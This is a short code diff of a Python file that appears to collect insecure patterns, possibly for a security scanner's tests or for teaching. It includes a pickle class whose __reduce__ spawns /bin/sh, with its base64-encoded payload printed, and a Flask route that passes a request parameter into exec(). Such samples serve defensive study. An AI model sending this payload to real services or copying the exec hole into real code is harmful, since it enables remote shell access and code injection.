@@ -21,19 +21,20 @@ def floor(request, user):
     # secure code...
 
 
-
 # Pickles
 class RunBinSh(object):
     def __reduce__(self):
-        return (subprocess.Popen, (('/bin/sh',),))
+        return subprocess.Popen, (('/bin/sh',),)
 
-def import_urlib_version(version):
+
+def import_ur_lib_version(version):
     exec("import urllib%s as urllib" % version)
+
 
 @app.route('/')
 def index():
     module = flask.request.args.get("module")
-    import_urlib_version(module)
+    import_ur_lib_version(module)
 
 
 print(base64.b64encode(pickle.dumps(RunBinSh())))
